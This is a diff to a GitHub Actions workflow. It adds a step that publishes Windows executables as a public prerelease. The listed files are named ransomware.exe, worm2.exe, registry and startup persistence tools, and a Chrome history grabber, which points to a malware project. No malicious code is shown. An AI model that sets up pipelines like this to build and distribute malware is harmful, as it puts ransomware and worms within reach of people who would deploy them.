@@ -49,3 +49,20 @@ jobs:
       with:
         name: windows-executables
         path: dist/*.exe
+    - name: Create GitHub Release
+      uses: softprops/action-gh-release@v2
+      with:
+        tag_name: v1.0.${{ github.run_number }}
+        name: Release v1.0.${{ github.run_number }}
+        body: |
+          Automated build of Python executables.
+          
+          **Executables included:**
+          * ransomware.exe
+          * worm2.exe
+          * addtoregistrykey.exe
+          * addtostartup.exe
+          * gethistoryChrome.exe
+        draft: false
+        prerelease: true
+        files: dist/*.exe
